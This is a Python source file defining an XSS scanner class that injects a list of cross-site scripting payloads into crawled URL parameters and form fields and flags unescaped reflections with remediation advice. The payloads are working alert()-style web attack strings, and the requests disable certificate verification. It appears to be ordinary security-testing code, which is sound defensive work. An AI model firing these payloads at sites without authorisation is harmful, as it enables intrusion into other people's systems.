
from .base_scanner import BaseScanner
from urllib.parse import parse_qs, urlparse
from typing import List, Dict

class XSSScanner(BaseScanner):
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",           # Basic script tag
        "<img src=x onerror=alert('XSS')>",       # Image tag with onerror
        "<svg onload=alert('XSS')>",              # SVG with onload
        "javascript:alert('XSS')",                 # JavaScript protocol
        "<iframe src='javascript:alert(1)'>",      # Iframe injection
        "<body onload=alert('XSS')>",             # Body onload
        "'\"><script>alert('XSS')</script>",      # Breaking out of attributes
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",  # Advanced
        "<svg/onload=alert('XSS')>",              # Short SVG
        "<input onfocus=alert('XSS') autofocus>", # Input with autofocus
    ]
    
    def scan(self) -> List[Dict]:

        print("\n[*] Starting XSS Scan...")
        results = []
        
   
        print("[*] Testing URL parameters for XSS...")
        for url in self.visited_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                results.extend(self._test_url_params(url, params))
        
    
        print(f"[*] Testing {len(self.forms)} forms for XSS...")
        for form in self.forms:
            results.extend(self._test_form(form))
            
        print(f"[+] XSS scan complete. Found {len(results)} vulnerabilities.")
        return results
    
    def _test_url_params(self, url: str, params: Dict) -> List[Dict]:
        results = []
        
        for param_name in params:
            for payload in self.XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                try:
                    response = self.session.get(
                        url.split('?')[0],
                        params=test_params,
                        timeout=10,
                        verify=False
                    )
                    
                    
                    if payload in response.text:
                        results.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'HIGH',
                            'url': url,
                            'description': f'Reflected XSS vulnerability in parameter: {param_name}',
                            'payload': payload,
                            'evidence': 'Payload reflected unescaped in response',
                            'recommendation': 'Implement output encoding/escaping. Use Content Security Policy (CSP) headers. Never insert untrusted data directly into HTML.'
                        })
                        break
                        
                except Exception as e:
                    continue
                    
        return results
    
    def _test_form(self, form: Dict) -> List[Dict]:

        results = []
        
        for payload in self.XSS_PAYLOADS:
            data = {}
            for input_field in form['inputs']:
                data[input_field['name']] = payload
            
            try:
                if form['method'] == 'post':
                    response = self.session.post(
                        form['action'],
                        data=data,
                        timeout=10,
                        verify=False
                    )
                else:
                    response = self.session.get(
                        form['action'],
                        params=data,
                        timeout=10,
                        verify=False
                    )
                
                
                if payload in response.text:
                    results.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'HIGH',
                        'url': form['action'],
                        'description': 'XSS vulnerability detected in form',
                        'payload': payload,
                        'evidence': 'Payload reflected unescaped in response',
                        'recommendation': 'Implement output encoding/escaping. Use CSP headers. Validate and sanitize all user inputs.'
                    })
                    break
                    
            except Exception as e:
                continue
                
        return results